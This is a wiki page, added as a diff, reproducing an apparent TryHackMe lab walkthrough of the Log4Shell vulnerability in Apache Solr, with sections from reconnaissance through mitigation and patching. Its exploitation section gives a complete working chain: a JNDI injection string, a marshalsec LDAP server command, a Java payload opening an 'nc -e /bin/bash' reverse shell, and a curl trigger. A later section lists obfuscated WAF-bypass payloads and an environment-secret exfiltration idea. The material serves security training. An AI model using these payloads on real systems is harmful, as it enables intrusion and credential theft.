@@ -1,0 +1,173 @@
+<!--
+title: Log4j
+description: 
+published: true
+date: 2023-02-12T23:26:56.607Z
+tags: 
+editor: ckeditor
+dateCreated: 2023-02-12T23:26:56.607Z
+-->
+
+<h1>CVE-2021-44228 Introduction</h1>
+<p>On December 9th, 2021, the world was made aware of a new vulnerability identified as CVE-2021-44228, affecting the Java logging package <code><strong>log4j</strong></code>. This vulnerability earned a severity score of 10.0 (the most critical designation) and offers remote code trivial remote code execution on hosts engaging with software that utilizes this <code><strong>log4j</strong></code> version. This attack has been dubbed "Log4Shell"</p>
+<p>Today, <code><strong>log4j</strong></code> version <code><strong>2.16.0</strong></code>&nbsp;is available and patches this vulnerability (JNDI is fully disabled, support for Message Lookups is removed, and the new DoS vulnerability CVE-2021-45046 is not present).&nbsp;<a href="https://github.com/apache/logging-log4j2/releases/tag/rel%2F2.16.0">https://github.com/apache/logging-log4j2/releases/tag/rel%2F2.16.0</a></p>
+<p>However, the sheer danger of this vulnerability is due to how ubiquitous the logging package is. Millions of applications as well as software providers use this package as a dependency in their own code. While you may be able to patch your own codebase using <code><strong>log4j</strong></code>, other vendors and manufacturers will still need to push their own security updates downstream. Many security researchers have likened this vulnerability to that of <a href="https://en.wikipedia.org/wiki/Shellshock_(software_bug)">Shellshock</a> by the nature of its enormous attack surface. We will see this vulnerability for years to come.</p>
+<p>For a growing community-supported list of software and services vulnerable to CVE-2021-44228, check out this GitHub repository:</p>
+<ul>
+  <li><a href="https://github.com/YfryTchsGD/Log4jAttackSurface">https://github.com/YfryTchsGD/Log4jAttackSurface</a></li>
+</ul>
+<p>This room will showcase how you can test for, exploit, and mitigate this vulnerability within Log4j.</p>
+<p>While there are a number of other articles, blogs, resources and learning material surrounding CVE-2021-44228, I (the author of this exercise) am particularly partial to these:&nbsp;</p>
+<ul>
+  <li><a href="https://www.huntress.com/blog/rapid-response-critical-rce-vulnerability-is-affecting-java">https://www.huntress.com/blog/rapid-response-critical-rce-vulnerability-is-affecting-java</a></li>
+  <li><a href="https://log4shell.huntress.com/">https://log4shell.huntress.com/</a></li>
+  <li><a href="https://www.youtube.com/watch?v=7qoPDq41xhQ">https://www.youtube.com/watch?v=7qoPDq41xhQ</a></li>
+</ul>
+<h1>Reconnaissance</h1>
+<p>The target virtual machine includes software that utilizes this vulnerable <code><strong>log4j</strong></code> package, offering you a playground to explore the vulnerability.</p>
+<p>After deploying your virtual machine, you should find that the IP address (accessible within the TryHackMe VPN or through the provided AttackBox) is <code><strong>MACHINE_IP</strong></code>.</p>
+<p>To begin, start with basic reconnaissance to understand what ports are open on this machine. This is best done within a Linux distribution, like Kali Linux, ParrotOS, Black Arch (or any other flavor of your choosing) with the <code><strong>nmap</strong></code> command-line tool:</p>
+<p>Run a basic nmap scan against vulnerable machine</p>
+<pre><code class="language-plaintext">attackbox@tryhackme$ nmap -v MACHINE_IP</code></pre>
+<p>The application present on this target specifically uses ports that may not be immediately noticed by <code><strong>nmap</strong></code>. For the "whole picture perspective," scan all ports like so:</p>
+<p>Scan all ports on machine via nmap</p>
+<pre><code class="language-plaintext">attackbox@tryhackme$ nmap -v -p- MACHINE_IP</code></pre>
+<h1>Discovery</h1>
+<p>This target machine is running Apache Solr 8.11.0, one example of software that is known to include this vulnerable <code><strong>log4j</strong></code> package. For the sake of showcasing this vulnerability, the application runs on Java 1.8.0_181.</p>
+<p>Explore the web interface accessible at <code><strong>http://MACHINE_IP:8983</strong></code>&nbsp;and click around to get a feel for the application. For more detail on Apache Solr, please refer to their official website.&nbsp;<a href="https://solr.apache.org/">https://solr.apache.org/</a></p>
+<p>This instance of Apache Solr is provisioned with no data whatsoever. It is a flat, vanilla, and absolutely minimum installation -- yet at its core it is still vulnerable to this CVE-2021-44228.&nbsp;</p>
+<h1>Proof of Concept</h1>
+<p>Note that the URL endpoint that you have just uncovered needs to be prefaced with the <code><strong>solr/</strong></code>&nbsp;prefix when viewing it from the web interface. This means that you should visit:</p>
+<p><code><strong>http://MACHINE_IP:8983/solr/admin/cores</strong></code></p>
+<p>You also noticed that <code><strong>params</strong></code>&nbsp;seems to be included in the log file. At this point, you may already be beginning to see the attack vector.</p>
+<p>The log4j package adds extra logic to logs by "parsing" entries, ultimately to enrich the data -- but may additionally take actions and even evaluate code based off the entry data. This is the gist of CVE-2021-44228. Other syntax might be in fact <i>executed</i> just as it is entered into log files.&nbsp;</p>
+<p>Some examples of this syntax are:</p>
+<ul>
+  <li><code><strong>${sys:os.name}</strong></code></li>
+  <li><code><strong>${sys:user.name}</strong></code></li>
+  <li><code><strong>${log4j:configParentLocation}</strong></code></li>
+  <li><code><strong>${ENV:PATH}</strong></code></li>
+  <li><code><strong>${ENV:HOSTNAME}</strong></code></li>
+  <li><code><strong>${java:version}</strong></code></li>
+</ul>
+<p>You may already know the general payload to abuse this log4j vulnerability. The format of the usual syntax that takes advantage of this looks like so:</p>
+<p style="text-align:center;"><code><strong>${jndi:ldap://ATTACKERCONTROLLEDHOST}</strong></code></p>
+<p>This syntax indicates that the log4j will invoke functionality from "JNDI", or the "Java Naming and Directory Interface." Ultimately, this can be used to access external resources, or "references," which is what is weaponized in this attack.&nbsp;</p>
+<p>Notice the <code><strong>ldap://</strong></code> schema. This indicates that the target will reach out to an endpoint (an attacker controlled location, in the case of this attack) via the LDAP protocol. For the sake of brevity, we will not need to cover all the ins-and-outs and details of LDAP here, but know that this is something we will need to work with as we refine our attack.</p>
+<p>For now, know that the target will in fact make a connection to an external location. This is indicated by the <code><strong>ATTACKERCONTROLLEDHOST</strong></code>&nbsp;placeholder in the above syntax. You, acting as the attacker in this scenario, can host a simple listener to view this connection.</p>
+<p>The next question is, where could we enter this syntax?</p>
+<p><strong>Anywhere that has data logged by the application.</strong></p>
+<p>This is the crux of this vulnerability. Unfortunately, it is very hard to determine where the attack surface is for different applications, and ergo, <i>what</i>&nbsp;applications are in fact vulnerable. Simply seeing the presence of log4j files doesn't clue in on the exact version number, or even where or how the application might use the package.</p>
+<p>Think back to the previous task. You already discovered that you could supply <code><strong>params</strong></code> to the <code><strong>/solr/admin/cores</strong></code> URL, and now that you have a better understanding of how log4j works, you should understand that <i>this</i>&nbsp;is where you supply your inject syntax. You can simply supply HTTP GET variables or parameters which will then processed and parsed by log4j. All it takes is this single line of text -- and that makes this vulnerability extremely easy to exploit.</p>
+<p>Other locations you might supply this JNDI syntax:</p>
+<ul>
+  <li>Input boxes, user and password login forms, data entry points within applications</li>
+  <li>HTTP headers such as <code><strong>User-Agent</strong></code>, <code><strong>X-Forwarded-For</strong></code>, or other customizable headers</li>
+  <li><strong>Any place for user-supplied data</strong></li>
+</ul>
+<p>If you would like more information on this JNDI attack vector, please review this Black Hat USA presentation from 2016.</p>
+<p><a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf">https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf</a></p>
+<h1>Exploitation</h1>
+<p>At this point, you have verified the target is in fact vulnerable by seeing this connection caught in your <code><strong>netcat</strong></code> listener. However, it made an LDAP request... so all your <code><strong>netcat</strong></code> listener may have seen was non-printable characters (strange looking bytes). We can now build upon this foundation to respond with a real LDAP handler.</p>
+<p>We will utilize a open-source and public utility to stage an "<strong>LDAP Referral Server</strong>". This will be used to essentially redirect the initial request of the victim to another location, where you can host a secondary payload that will ultimately run code on the target. This breaks down like so:</p>
+<ol>
+  <li><code><strong>${jndi:<u>ldap://</u>attackerserver:1389/Resource}</strong></code> -&gt; reaches out to our LDAP Referral Server</li>
+  <li>LDAP Referral Server springboards the request to a secondary <code><strong><u>http://</u>attackerserver/resource</strong></code></li>
+  <li>The victim retrieves and executes the code present in&nbsp;<code><strong><u>http://</u>attackerserver/resource</strong></code></li>
+</ol>
+<p>This means we will need an HTTP server, which we could simply host with any of the following options (serving on port 8000):</p>
+<ul>
+  <li><code><strong>python3 -m http.server</strong></code></li>
+  <li><code><strong>php -S 0.0.0.0:8000</strong></code></li>
+  <li>(or any other <code><strong>busybox httpd</strong></code> or formal web service you might like)</li>
+</ul>
+<p>If you get stuck on any of the following steps, we have a video showcasing (using the AttackBox) each step to gain remote code execution:&nbsp;<a href="https://youtu.be/OJRqyCHheRE">https://youtu.be/OJRqyCHheRE</a></p>
+<p>The first order of business however is obtaining the LDAP Referral Server. We will use the&nbsp;<code><strong>marshalsec</strong></code>&nbsp;utility offered at&nbsp;<a href="https://github.com/mbechler/marshalsec">https://github.com/mbechler/marshalsec</a></p>
+<p>Ultimately, this needs to run Java. Reviewing the README for this utility, it suggests using Java 8. (You may or may not have success using a different version, but to "play by the rules," we will match the same version of Java used on the target virtual machine)</p>
+<p>If you are using the TryHackMe AttackBox, you do NOT need to follow the below steps - move onto the next question.</p>
+<p>See steps to installing Java 8 locally (follow only if not using AttackBox)</p>
+<p>Next we will need to retrieve the marshalsec utility referenced previously.&nbsp;If you're on the AttackBox, navigate to <code>/root/Rooms/solar/marshalsec</code></p>
+<p>Navigate to marshalsec folder</p>
+<pre><code class="language-plaintext">attackbox@tryhackme$ cd /root/Rooms/solar/marshalsec</code></pre>
+<p>See steps to download marshalsec locally (follow only if not using AttackBox)</p>
+<p>We must build marshalsec with the Java builder maven.&nbsp;If you do not yet have maven on your system, you can install it&nbsp;through your package manager (not needed if you're using the AttackBox):&nbsp;<code>sudo apt install maven</code></p>
+<p>Next, run the command to build the <code><strong>marshalsec</strong></code> utility:</p>
+<p>Build marshalsec tool with maven</p>
+<pre><code class="language-plaintext">attackbox@tryhackme:~/root/Rooms/solar/marshalsec$ mvn clean package -DskipTests</code></pre>
+<p>Please note, the AttackBox for free users doesn't have internet and won't install the maven packages. Either subscribe to complete this lab through the AttackBox, or install the marshlsec tool locally.</p>
+<p>With the marshalsec utility built, we can start an LDAP referral server to direct connections to our secondary HTTP server (which we will prepare in just a moment). You are more than welcome to dig into the usage, parameters and other settings that can be configured with this tool -- but for the sake of demonstration, the syntax to start the LDAP server is as follows:</p>
+<p><strong>Start LDAP Server</strong></p>
+<pre><code class="language-plaintext">attackbox@tryhackme:~/root/../marshalsec$ java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://YOUR.ATTACKER.IP.ADDRESS:8000/#Exploit"</code></pre>
+<p>Adjust the IP address for your attacking machine as needed. Note that we will supplied the HTTP port listening on 8000.</p>
+<p><strong>What is the output of running this command? (You should leave this terminal window open as it will be actively awaiting connections)</strong></p>
+<p>Now that our LDAP server is ready and waiting, we can open a second terminal window to prepare and our final payload and secondary HTTP server.</p>
+<p>Ultimately, the log4j vulnerability will execute arbitrary code that you craft within the Java programming language. If you aren't familiar with Java, don't fret -- we will use simple syntax that simply "shells out" to running a system command. In fact, we will retrieve a reverse-shell connection so we can gain control over the target machine!</p>
+<p>Create and move into a new directory where you might host this payload. First, create your payload in a text editor of your choice (mousepad, nano, vim, Sublime Text, VS Code, whatever), with the <strong>specific</strong>&nbsp;name <code><strong>Exploit.java</strong></code>:</p>
+<p>Save the Java exploit code &amp; change to use your IP</p>
+<pre><code class="language-plaintext">public class Exploit {
+    static {
+        try {
+            java.lang.Runtime.getRuntime().exec("nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999");
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+}</code></pre>
+<p>Modify your attacker IP address and port number as appropriate (we are using 9999 as the example port number as before).</p>
+<p>For this payload, you can see we will execute a command on the target, specifically nc -e /bin/bash to call back to our our attacker machine. This target has been configured with ncat for ease of exploitation, though you are more than welcome to experiment with other payloads.</p>
+<p><strong>Compile your payload with </strong><code><strong>javac Exploit.java -source 8 -target 8</strong></code><strong>&nbsp;and verify it succeeded by running the </strong><code><strong>ls</strong></code><strong> command and finding a newly created </strong><code><strong>Exploit.class</strong></code><strong> file; </strong><i><strong>remove "-source 8 -target 8" from command if not using attackbox.</strong></i></p>
+<p>Compile Java exploit code</p>
+<pre><code class="language-plaintext">attackbox@tryhackme$ javac Exploit.java -source 8 -target 8</code></pre>
+<p>Run the above in the same folder as where you saved the Exploit.java file</p>
+<p>With your payload created and compiled, you can now host it by spinning up a temporary HTTP server.&nbsp;</p>
+<p>Host the exploit Java file via HTTP</p>
+<pre><code class="language-plaintext">attackbox@tryhackme$ python3 -m http.server</code></pre>
+<p>Your payload is created and compiled, it is hosted with an HTTP server in one terminal, your LDAP referral server is up and waiting in another terminal -- next prepare a netcat listener to catch your reverse shell in yet another new terminal window:</p>
+<p>Prepare your netcat listener</p>
+<pre><code class="language-plaintext">attackbox@tryhackme$ nc -lnvp 9999</code></pre>
+<p>Finally, all that is left to do is trigger the exploit and fire off our JNDI syntax! Note the changes in port number (now referring to our LDAP server) and the resource we retrieve, specifying our exploit:</p>
+<p>Trigger the exploit and fire off our JNDI syntax</p>
+<pre><code class="language-plaintext">attackbox@tryhackme$ curl 'http://MACHINE_IP:8983/solr/admin/cores?foo=$\{jndi:ldap://YOUR.ATTACKER.IP.ADDRESS:1389/Exploit\}'</code></pre>
+<p>Modify your attacker IP address as appropriate.<br>&nbsp;</p>
+<p>You have now received initial access and command-and-control on a vanilla, freshly installed Apache Solr instance. This is just one example of many, <i>many </i>vulnerable applications affected by this log4j vulnerability.&nbsp;</p>
+<p>At this point, a threat actor can realistically do whatever they would like with the victim -- whether it be privilege escalation, exfiltration, install persistence, perform lateral movement or any other post-exploitation -- potentially dropping cryptocurrency miners, remote access trojans, beacons and implants or even deploying ransomware.&nbsp;</p>
+<p>After receiving a reverse shell, feel free to experiment with other commands you could run with your <code>Exploit.java</code> payload. As an exercise for the reader -- can you get a Meterpreter shell loaded? How about an Empire agent? A Cobalt Strike beacon?&nbsp;&nbsp;</p>
+<h1>Persistence</h1>
+<p>Now that you have gained a reverse shell connection on the victim machine, you can continue to take any action you might like.</p>
+<p>To better understand this <code><strong>log4j</strong></code> vulnerability, let's grant ourselves "better access" so we can explore the machine, analyze the affected logs, and even mitigate the vulnerability!</p>
+<p>You may have noticed from your earlier <code><strong>nmap</strong></code> scan that SSH (port 22) was open on the host. We did not know any usernames or passwords at the point, so trying against that protocol would be useless -- but now that you have code execution as a user, you could potentially add private keys or change passwords.&nbsp;</p>
+<h1>Detection</h1>
+<p>Unfortunately, finding applications vulnerable to CVE-2021-44228 "Log4Shell" is <i><strong>hard</strong></i>.</p>
+<p>Detecting exploitation might be even harder, considering the unlimited amount of potential bypasses.&nbsp;</p>
+<p>With that said, the information security community has seen an incredible outpouring of effort and support to develop tooling, script, and code to better constrain this threat. While this room won't showcase every technique in detail, you can again find an enormous amount of resources online.</p>
+<p>Below are snippets that might help either effort:</p>
+<ul>
+  <li><a href="https://github.com/mubix/CVE-2021-44228-Log4Shell-Hashes">https://github.com/mubix/CVE-2021-44228-Log4Shell-Hashes</a>&nbsp;(local, based off hashes of log4j JAR files)</li>
+  <li><a href="https://gist.github.com/olliencc/8be866ae94b6bee107e3755fd1e9bf0d">https://gist.github.com/olliencc/8be866ae94b6bee107e3755fd1e9bf0d</a>&nbsp;(local, based off hashes of log4j CLASS files)</li>
+  <li><a href="https://github.com/nccgroup/Cyber-Defence/tree/master/Intelligence/CVE-2021-44228">https://github.com/nccgroup/Cyber-Defence/tree/master/Intelligence/CVE-2021-44228</a>&nbsp;(listing of vulnerable JAR and CLASS hashes)</li>
+  <li><a href="https://github.com/omrsafetyo/PowerShellSnippets/blob/master/Invoke-Log4ShellScan.ps1">https://github.com/omrsafetyo/PowerShellSnippets/blob/master/Invoke-Log4ShellScan.ps1</a>&nbsp;(local, hunting for vulnerable log4j packages in PowerShell)</li>
+  <li><a href="https://github.com/darkarnium/CVE-2021-44228">https://github.com/darkarnium/CVE-2021-44228</a>&nbsp;(local, YARA rules)</li>
+</ul>
+<p>As a reminder, a massive resource is available here:&nbsp;</p>
+<p><a href="https://www.reddit.com/r/sysadmin/comments/reqc6f/log4j_0day_being_exploited_mega_thread_overview/">https://www.reddit.com/r/sysadmin/comments/reqc6f/log4j_0day_being_exploited_mega_thread_overview/</a></p>
+<h1>Bypasses</h1>
+<p>The JNDI payload that we have showcased is the standard and "typical" syntax for performing this attack.</p>
+<p>If you are a penetration tester or a red teamer, this syntax might be caught by web application firewalls (WAFs) or easily detected. If you are a blue teamer or incident responder, you should be actively hunting for and detecting that syntax.</p>
+<p>Because this attack leverages <code><strong>log4j</strong></code>, the payload can ultimately access all of the same expansion, substitution, and templating tricks that the package makes available. This means that a threat actor could use any sort of tricks to hide, mask, or obfuscate the payload.</p>
+<p>With that in mind, there are honestly an unlimited number of bypasses to sneak in this syntax. While we will not be diving into the details in this exercise, you are encouraged to play with them in this environment. Read them carefully to understand what tricks are being used to masquerade the original syntax.</p>
+<p>There are numerous resources online that showcase some examples of these bypasses, with a few offered below:</p>
+<p><strong>${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attackerendpoint.com/}${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attackerendpoint.com/}${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://attackerendpoint.com/}${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attackerendpoint.com/z}${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attackerendpoint.com/}${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attackerendpoint.com/}${${::-j}ndi:rmi://attackerendpoint.com/}</strong></p>
+<p>Note the use of the <code><strong>rmi://</strong></code> protocol in the last one. This is also another valid technique that can be used with the <code><strong>marshalsec</strong></code> utility -- feel free to experiment!</p>
+<p>Additionally, within the log4j engine, you can expand arbitrary environment variables (if this wasn't already bad enough). Consider the damage that could be done even with remote code execution, but a simple LDAP connection and exfiltration of&nbsp;<code><strong>${env:AWS_SECRET_ACCESS_KEY}</strong></code></p>
+<p>For other techniques, you are strongly encouraged t do your own research. There is a significant amount of information being shared in this Reddit thread:&nbsp;<a href="https://www.reddit.com/r/sysadmin/comments/reqc6f/log4j_0day_being_exploited_mega_thread_overview/">https://www.reddit.com/r/sysadmin/comments/reqc6f/log4j_0day_being_exploited_mega_thread_overview/</a></p>
+<h1>Mitigation</h1>
+<p>Now that you have acted as the adversary for a little bit, please take off your hacker hat and let's mitigate the vulnerability on this vulnerable machine!&nbsp;Review the mitigation techniques suggested on the Apache Solr website.&nbsp;<a href="https://solr.apache.org/security.html">https://solr.apache.org/security.html</a></p>
+<p>One option is to manually modify the&nbsp;<code><strong>solr.in.sh</strong></code><strong> </strong>file with a specific syntax. Let's go down that route for the sake of showcasing this defensive tactic.<br>The Apache Solr website Security page explains that you can add this specific syntax to the <code><strong>solr.in.sh</strong></code> file:</p>
+<p><code><strong>SOLR_OPTS="$SOLR_OPTS -Dlog4j2.formatMsgNoLookups=true"</strong></code></p>
+<h1>Patching</h1>
+<p>At the time of creating this exercise, Apache Solr 8.11.1 has not yet been released with a formal patch for CVE-2021-44228. Alongside many other software providers, the industry is frantically scrambling to patch their software and push it downstream to end users as quickly as they can.</p>
+<p><strong>Please be understanding of this frenzy. </strong>There are so many potential places that this log4j vulnerability could be present, we may never see the end of this vulnerability for a long, long time. The onus is on you, on me, on each and every one of us to raise awareness of this incident, and hold the community accountable for actively responding.&nbsp; When the time comes, roll out the patches that have been made available and continue to hunt for instances of this vulnerability. It takes a village.</p>
+<p>Where appropriate, please ensure you patch the <code><strong>logging-log4j</strong></code>&nbsp;package to version <code><strong>2.16.0</strong></code>&nbsp;or higher (as new releases come available). In version&nbsp;<code>2.16.0</code>&nbsp;,&nbsp;JNDI is fully disabled, support for Message Lookups is removed, and the new DoS vulnerability CVE-2021-45046 is not present. Download this release here:&nbsp;<a href="https://github.com/apache/logging-log4j2/releases/tag/rel%2F2.16.0">https://github.com/apache/logging-log4j2/releases/tag/rel%2F2.16.0</a></p>
+<p>If you're responsible for identifying vulnerable services that use log4j, there is a list of a few majorly affected services/products&nbsp;<a href="https://www.techsolvency.com/story-so-far/cve-2021-44228-log4j-log4shell/">here</a>.</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
